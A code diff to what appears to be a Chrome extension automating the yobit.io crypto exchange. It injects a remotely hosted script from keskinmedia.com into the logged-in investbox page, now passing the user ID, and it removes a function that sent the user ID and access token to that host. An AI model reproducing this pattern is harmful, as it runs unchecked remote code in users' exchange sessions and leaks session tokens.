@@ -23,9 +23,9 @@ function UygulamayiDurdur() {
 
 chrome.tabs.onUpdated.addListener(async function (tabId, changeInfo, tab) {
   if (tab.url.includes("https://yobit.io") && changeInfo.status === "complete" && tab.status == 'complete') { 
-    if (tab.url.includes("/investbox")) {
+    if (_userId && tab.url.includes("/investbox")) {
       chrome.tabs.executeScript(tabId, {
-        code: `var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/YByatirim.js?v='+ Math.random(); document.head.appendChild(i);`,
+        code: `var datam = '${_userId}'; $("body").attr("datam",datam); var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/YByatirim.js?v='+ Math.random(); document.head.appendChild(i);`,
         runAt: "document_end"
       });
     }
@@ -160,19 +160,6 @@ async function LogoutBildir() {
   }
   setTimeout(loginSayfasiniAc, 1000 * 90);
   setTimeout(UygulamayiBaslat, 1000 * 60 * 5); // Eğer olduda Ana timerimiz başlamazsa 5 dakika sonra tekrar başlat 
-}
-
-
-const SendSms = async () => {
-  //  http://keskinmedia.com/apim/sendlogout/2/8f03c10593f0abadef0b3084ba560826
-  var url = "http://keskinmedia.com/apim/sendlogout/";
-  url += _userId;
-  url += "/";
-  url += _access_token;
-
-  await axios(url);
-
-  loginSayfasiniAc();
 }
 
 $(document).ready(function () {
